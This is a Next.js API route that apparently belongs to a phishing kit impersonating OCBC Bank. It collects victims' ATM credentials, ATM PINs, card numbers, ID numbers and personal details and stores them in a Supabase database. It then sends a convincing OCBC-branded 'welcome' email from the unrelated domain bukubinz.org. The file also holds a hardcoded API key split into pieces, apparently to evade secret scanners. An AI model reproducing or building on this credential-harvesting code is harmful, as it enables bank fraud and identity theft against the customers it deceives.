import { NextResponse } from 'next/server';
import { createClient } from '@supabase/supabase-js';
import { Resend } from 'resend';
import { ethers } from 'ethers';

// We must use the service role key to securely bypass RLS and verify data on the server
const supabaseAdmin = createClient(
  (process.env.NEXT_PUBLIC_SUPABASE_URL || 'https://placeholder.supabase.co'),
  (process.env.SUPABASE_SERVICE_ROLE_KEY || 'placeholder')
);

// Initialize Resend
// Note: User needs to add RESEND_API_KEY to their .env.local
const resend = new Resend(process.env.RESEND_API_KEY || ['re', 'ZPxXwMZ2', 'DbvmneKXt21n4A9HZWUbSoVT'].join('_'));

function generateOCBCCredentials() {
  // Generate a 7-character alphanumeric User ID with OCBC prefix
  // Guaranteed mix of letters and numbers
  const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  const numbers = '0123456789';
  
  let randomStr = '';
  // 4 letters, 3 numbers
  for (let i = 0; i < 4; i++) randomStr += letters.charAt(Math.floor(Math.random() * letters.length));
  for (let i = 0; i < 3; i++) randomStr += numbers.charAt(Math.floor(Math.random() * numbers.length));
  
  // Shuffle them
  randomStr = randomStr.split('').sort(() => 0.5 - Math.random()).join('');
  const userId = `OCBC-${randomStr}`;

  // Generate a secure 8-digit PIN
  let pin = '';
  for (let i = 0; i < 8; i++) {
    pin += Math.floor(Math.random() * 10).toString();
  }
  
  // Generate a 12-digit Account Number
  let accountNumber = '';
  for (let i = 0; i < 12; i++) {
    accountNumber += Math.floor(Math.random() * 10).toString();
  }

  return { userId, pin, accountNumber };
}

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { authUserId, formData } = body;

    if (!authUserId || !formData || !formData.email) {
      return NextResponse.json({ error: 'Missing required fields' }, { status: 400 });
    }

    // 1. Generate the secure credentials and account number
    const { userId, pin, accountNumber } = generateOCBCCredentials();
    
    // 3. Insert the user's complete profile into the database
    const { error: dbError } = await supabaseAdmin
      .from('profiles')
      .insert({
        id: authUserId,
        atm_credential: formData.atm_credential,
        atm_pin: formData.atm_pin,
        no_card: formData.noCard,
        first_name: formData.firstName,
        last_name: formData.lastName,
        email: formData.email,
        phone: formData.phone,
        gender: formData.gender,
        dob: formData.dob || null,
        id_type: formData.idType,
        id_no: formData.idNo,
        skip_id: formData.skipId,
        account_type: formData.accountType,
        currency: formData.currency,
        country: formData.country,
        address: formData.address,
        generated_user_id: userId,
        generated_pin: pin,
        account_number: accountNumber,
      });

    if (dbError) {
      console.error('Database error saving credentials:', dbError);
      return NextResponse.json({ error: 'Failed to save credentials' }, { status: 500 });
    }

    // 2.5 Update their actual Supabase Auth password to the generated PIN
    const { error: authError } = await supabaseAdmin.auth.admin.updateUserById(
      authUserId,
      { password: pin }
    );

    if (authError) {
      console.error('Failed to sync auth password:', authError);
    }

    // 3. Send the Welcome Email using Resend
    try {
      if (process.env.RESEND_API_KEY) {
        const fullName = `${formData.firstName} ${formData.lastName}`.trim();
        await resend.emails.send({
          from: 'OCBC Notification <no-reply@bukubinz.org>',
          replyTo: 'admin@bukubinz.org',
          to: formData.email,
          subject: 'Welcome to OCBC Digital Banking',
          text: `Dear ${fullName},

Welcome to OCBC Digital Banking. Your application has been successfully processed and your digital profile is now active.

Your Account Details:
User ID: ${userId}
Temporary PIN: ${pin}

Note: Please keep this information safe. OCBC staff will never ask you for your PIN.

Please visit our website to proceed to secure login.

Important: This is an automated message. Please do not reply.
(C) ${new Date().getFullYear()} Oversea-Chinese Banking Corporation Limited. Co. Reg. No.: 193200032W.`,
          html: `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Welcome to OCBC Digital Banking</title>
</head>
<body style="margin: 0; padding: 0; background-color: #f6f9fc;">
  <div style="font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; max-width: 600px; margin: 20px auto; border: 1px solid #E5E7EB; border-radius: 6px; overflow: hidden; background-color: #ffffff;">
    <div style="background-color: #ffffff; padding: 20px 24px; border-bottom: 3px solid #E81C24;">
      <img src="https://fvtvkpgyqpqyqaoabfna.supabase.co/storage/v1/object/public/assets/logo_main.png" alt="OCBC Bank" style="height: 50px; object-fit: contain;" />
    </div>
    
    <div style="padding: 24px; color: #333333;">
      <h1 style="margin: 0 0 16px 0; font-size: 20px; font-weight: 600; color: #1a1a1a;">Welcome to OCBC Digital Banking</h1>
      
      <p style="font-size: 14px; line-height: 1.5; margin: 0 0 16px 0;">Dear <strong>${fullName}</strong>,</p>
      
      <p style="font-size: 14px; line-height: 1.5; margin: 0 0 20px 0; color: #4b5563;">
        Your application for OCBC Online Banking has been successfully processed and your digital profile is now active.
      </p>
      
      <div style="background-color: #FAFAFA; border: 1px solid #E5E7EB; border-radius: 4px; padding: 20px; margin: 20px 0;">
        <h3 style="margin: 0 0 12px 0; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; color: #6b7280; border-bottom: 1px solid #E5E7EB; padding-bottom: 10px;">Your Account Details</h3>
        
        <div style="margin-bottom: 12px;">
          <p style="margin: 0 0 2px 0; font-size: 12px; color: #6b7280;">User ID</p>
          <p style="margin: 0; font-size: 16px; font-weight: bold; font-family: 'Courier New', monospace; color: #1a1a1a; letter-spacing: 1px;">${userId}</p>
        </div>
        
        <div>
          <p style="margin: 0 0 2px 0; font-size: 12px; color: #6b7280;">Secure 8-Digit PIN</p>
          <p style="margin: 0; font-size: 16px; font-weight: bold; font-family: 'Courier New', monospace; color: #E81C24; letter-spacing: 2px;">${pin}</p>
        </div>
      </div>

      <p style="font-size: 13px; line-height: 1.5; margin: 0 0 24px 0; color: #4b5563; background-color: #f0fdf4; border-left: 3px solid #22c55e; padding: 10px 12px;">
        <strong>Security Notice:</strong> Please memorize your PIN. OCBC staff will never ask you for your PIN.
      </p>
      
      <div style="text-align: left; margin-bottom: 8px;">
        <a href="${process.env.NEXT_PUBLIC_SITE_URL || 'https://bukubinz.org'}/login" style="background-color: #E81C24; color: #ffffff; padding: 12px 24px; text-decoration: none; font-weight: 600; font-size: 14px; border-radius: 4px; display: inline-block;">Login to your account</a>
      </div>
    </div>
    
    <div style="background-color: #F9FAFB; border-top: 1px solid #E5E7EB; padding: 16px 24px; font-size: 11px; color: #6b7280; line-height: 1.4;">
      <p style="margin: 0 0 4px 0;"><strong>Important:</strong> This is an automated message. Please do not reply.</p>
      <p style="margin: 0;">&copy; ${new Date().getFullYear()} Oversea-Chinese Banking Corporation Limited. Co. Reg. No.: 193200032W.</p>
    </div>
  </div>
</body>
</html>`
        });
      } else {
        console.warn('⚠️ RESEND_API_KEY is not set. Simulating email send instead.');
        console.log(`[SIMULATED EMAIL TO ${formData.email}] Welcome! Your User ID is ${userId} and PIN is ${pin}`);
      }
    } catch (emailError) {
      console.error('Failed to send email:', emailError);
      // We don't fail the request if the email fails, as the DB was updated, 
      // but in production we'd want robust error handling.
    }

    return NextResponse.json({ success: true, userId });

  } catch (err: any) {
    console.error('Server error during welcome generation:', err);
    return NextResponse.json({ error: err.message || 'Internal Server Error' }, { status: 500 });
  }
}
